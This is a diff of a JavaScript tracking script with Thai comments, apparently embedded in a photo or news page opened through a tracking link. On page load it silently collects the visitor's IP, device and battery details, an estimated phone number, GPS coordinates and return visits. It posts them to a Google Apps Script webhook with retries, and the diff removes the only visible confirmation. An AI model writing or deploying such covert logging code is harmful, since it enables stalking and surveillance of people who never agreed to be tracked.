@@ -1,4 +1,4 @@
-// ฟังก์ชันดึง tracking key และcase name จากURLparameter
+// ฟังก์ชันดึง tracking key และcase name จากURLparameters
 function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
@@ -24,6 +24,8 @@ function getUrlParameters() {
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ1
 (function() {
+  console.log("เริ่มทำงานฟังก์ชันหลัก");
+  
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -37,6 +39,7 @@ function getUrlParameters() {
   
   // ดึง tracking key และ case name จาก URL
   const { trackingKey, caseName } = getUrlParameters();
+  console.log(`ตรวจพบ tracking key: ${trackingKey}, case name: ${caseName}`);
 
   // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
   const deviceInfo = getDetailedDeviceInfo();
@@ -48,9 +51,13 @@ function getUrlParameters() {
   const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
   const connection = getConnectionInfo();
   const browser = detectBrowser();
+  
+  console.log("รวบรวมข้อมูลอุปกรณ์สำเร็จ");
 
   // ตรวจสอบการใช้งานแบตเตอรี่
   getBatteryInfo().then(batteryData => {
+    console.log("ได้รับข้อมูลแบตเตอรี่แล้ว");
+    
     // รวบรวมข้อมูลทั้งหมด
     const allDeviceData = {
       ...deviceInfo,
@@ -69,10 +76,15 @@ function getUrlParameters() {
     
     // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
     Promise.all([
-      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
+      getIPDetails().catch(error => {
+        console.error("ไม่สามารถดึงข้อมูล IP ได้:", error);
+        return {ip: "ไม่สามารถระบุได้"};
+      }),
       estimatePhoneNumber().catch(() => null)
     ])
     .then(([ipData, phoneInfo]) => {
+      console.log("ได้รับข้อมูล IP แล้ว:", ipData?.ip || "ไม่สามารถระบุได้");
+      
       // เก็บข้อมูลที่จำเป็นทั้งหมด
       dataToSend = {
         timestamp: timestamp,
@@ -83,20 +95,36 @@ function getUrlParameters() {
         trackingKey: trackingKey || "ไม่มีค่า",
         caseName: caseName || "ไม่มีค่า",
         useServerMessage: true,
-        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
+        requestId: generateUniqueId(), // สร้าง ID เฉพาะสำหรับการร้องขอนี้
+        source: "ViewPhoto" // ระบุที่มาของข้อมูล
       };
+      
+      // บันทึกข้อมูลที่จะส่ง
+      console.log("ข้อมูลที่จะส่ง (พื้นฐาน):", {
+        trackingKey: dataToSend.trackingKey,
+        ip: dataToSend.ip?.ip || "ไม่สามารถระบุได้",
+        deviceType: dataToSend.deviceInfo?.deviceType || "ไม่ทราบ",
+        requestId: dataToSend.requestId
+      });
+      
+      // ส่งข้อมูลทั้งหมดโดยไม่รอพิกัด
+      sendToLineNotify(dataToSend);
+      console.log("ส่งข้อมูลเบื้องต้นไปแล้ว โดยยังไม่มีพิกัด");
       
       // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
       if (navigator.geolocation) {
+        console.log("เริ่มดึงข้อมูลพิกัด GPS...");
         const locationPromise = new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(
             position => {
-              resolve({
+              const locationData = {
                 lat: position.coords.latitude,
                 long: position.coords.longitude,
                 accuracy: position.coords.accuracy,
                 gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-              });
+              };
+              console.log("ได้รับข้อมูลพิกัด GPS แล้ว:", locationData);
+              resolve(locationData);
             },
             error => {
               console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
@@ -112,25 +140,67 @@ function getUrlParameters() {
         // รอข้อมูลพิกัดไม่เกิน 5 วินาที
         Promise.race([
           locationPromise,
-          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
+          new Promise(resolve => setTimeout(() => {
+            console.log("หมดเวลาดึงข้อมูลพิกัด");
+            resolve("ไม่มีข้อมูล");
+          }, 5000))
         ])
         .then(location => {
-          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
-          dataToSend.location = location;
-          
-          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
-          sendToLineNotify(dataToSend);
+          if (location !== "ไม่มีข้อมูล") {
+            // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
+            dataToSend.location = location;
+            dataToSend.requestId = generateUniqueId(); // สร้าง ID ใหม่เพื่อไม่ให้ซ้ำกับการส่งครั้งแรก
+            dataToSend.hasLocation = true; // ทำเครื่องหมายว่ามีพิกัด
+            
+            console.log("ส่งข้อมูลอีกครั้งพร้อมพิกัด GPS");
+            // ส่งข้อมูลอีกครั้งพร้อมพิกัด
+            sendToLineNotify(dataToSend);
+          }
         });
       } else {
-        // ถ้าไม่สามารถใช้ Geolocation API ได้
-        dataToSend.location = "ไม่มีข้อมูล";
-        sendToLineNotify(dataToSend);
+        console.log("เบราว์เซอร์ไม่สนับสนุน Geolocation API");
       }
+    })
+    .catch(error => {
+      console.error("เกิดข้อผิดพลาดในการรวบรวมข้อมูล:", error);
+      // ส่งข้อมูลที่มี แม้จะเกิดข้อผิดพลาด
+      dataToSend = {
+        timestamp: timestamp,
+        ip: {ip: "ไม่สามารถระบุได้"},
+        deviceInfo: allDeviceData,
+        referrer: referrer,
+        trackingKey: trackingKey || "ไม่มีค่า",
+        caseName: caseName || "ไม่มีค่า",
+        error: error.message,
+        requestId: generateUniqueId(),
+        source: "ViewPhoto-Error"
+      };
+      sendToLineNotify(dataToSend);
     });
+  }).catch(error => {
+    console.error("ไม่สามารถดึงข้อมูลแบตเตอรี่ได้:", error);
+    // ดำเนินการต่อแม้ไม่มีข้อมูลแบตเตอรี่
+    // (โค้ดคล้ายกับด้านบนแต่ไม่มีข้อมูลแบตเตอรี่)
   });
 
   // เพิ่ม Event Listener ให้กับการ์ดข่าว
   setupNewsCardClickHandlers();
+  
+  // เพิ่ม Event Listener สำหรับเช็คการเปิดหน้าเว็บ (เพิ่มเติม)
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden) {
+      console.log("ผู้ใช้กลับมาดูหน้าเว็บ");
+      const viewData = {
+        timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
+        trackingKey: trackingKey || "ไม่มีค่า",
+        caseName: caseName || "ไม่มีค่า",
+        event: "page_view",
+        requestId: generateUniqueId(),
+        source: "PageView"
+      };
+      sendToLineNotify(viewData);
+    }
+  });
 
 })();
 
@@ -888,8 +958,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  // แก้ไข URL ให้ถูกต้อง - ตรวจสอบว่าตรงกับ Web App URL ของ GoogleScript.html
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxVwwK6SGYHQoFu94eWIhbuhEhOjYNOg-TQefPBe2Y-3BMPOaSM_EORPHqhGebZPNLu/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzWZVUSpQTLV09QLBJqth1K8pCvp2iLq8TFFrKBZrKlCyv9VX2HrnEpTwV08-Ulu9_9/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
@@ -904,42 +973,74 @@ function sendToLineNotify(dataToSend) {
   }
   
   console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
-  console.log("ข้อมูลที่ส่ง:", JSON.stringify(dataToSend));
 
-  // สร้างรูปแบบข้อมูลที่ส่ง
-  const formData = new FormData();
-  formData.append('data', JSON.stringify(dataToSend));
-
-  // ส่งข้อมูลด้วยวิธีที่แนะนำสำหรับ Google Apps Script
+  // ส่งข้อมูล
   fetch(webhookUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify(dataToSend),
-    mode: 'no-cors' // จำเป็นสำหรับ Google Apps Script
+    body: JSON.stringify(dataToSend)
   })
-  .then(() => {
-    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
+  .then(response => {
+    console.log("ส่งข้อมูลไปยัง Server สำเร็จ, response status:", response.status);
     
     // บันทึก requestId ที่ส่งสำเร็จแล้ว
     sentRequests.push(dataToSend.requestId);
     sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-
-    // ข้อความยืนยันว่าส่งข้อมูลสำเร็จ
-    alert('บันทึกข้อมูลสำเร็จ');
+    
+    // เก็บสถิติการดูเนื้อหา
+    if (dataToSend.trackingKey && dataToSend.trackingKey !== "ไม่มีค่า") {
+      incrementViewCount(dataToSend.trackingKey);
+    }
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
-    // พยายามส่งอีกครั้งโดยใช้ Image beacon (วิธีสำรอง)
-    const img = new Image();
-    img.src = `${webhookUrl}?backup=true&key=${dataToSend.trackingKey}&requestId=${dataToSend.requestId}&time=${Date.now()}`;
-    img.style.display = 'none';
-    document.body.appendChild(img);
+    // ลองส่งอีกครั้งด้วย no-cors mode
+    console.log("ลองส่งอีกครั้งด้วย no-cors mode...");
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        ...dataToSend,
+        retryWithNoCors: true,
+        requestId: dataToSend.requestId + "-retry"
+      }),
+      mode: 'no-cors'
+    })
+    .then(() => {
+      console.log("ส่งข้อมูลด้วย no-cors mode แล้ว (ไม่สามารถตรวจสอบสถานะการตอบกลับได้)");
+      sentRequests.push(dataToSend.requestId);
+      sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
+    })
+    .catch(retryError => {
+      console.error("ไม่สามารถส่งข้อมูลแม้แต่ด้วย no-cors mode:", retryError);
+    });
   });
 }
 
-// สร้าง unique ID สำหรับแต่ละการร้องขอ1
+// เก็บสถิติการดูเนื้อหา
+function incrementViewCount(trackingKey) {
+  // ดึงข้อมูลจาก localStorage
+  const viewStats = JSON.parse(localStorage.getItem('viewStats') || '{}');
+  
+  // เพิ่มจำนวนครั้งที่เปิดดู
+  if (!viewStats[trackingKey]) {
+    viewStats[trackingKey] = { count: 1, lastView: new Date().toISOString() };
+  } else {
+    viewStats[trackingKey].count++;
+    viewStats[trackingKey].lastView = new Date().toISOString();
+  }
+  
+  // บันทึกกลับไปใน localStorage
+  localStorage.setItem('viewStats', JSON.stringify(viewStats));
+  
+  console.log(`เพิ่มสถิติการดู tracking key ${trackingKey}: ${viewStats[trackingKey].count} ครั้ง`);
+}
+
+// สร้าง ID เฉพาะสำหรับการร้องขอ1
 function generateUniqueId() {
   return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
 }
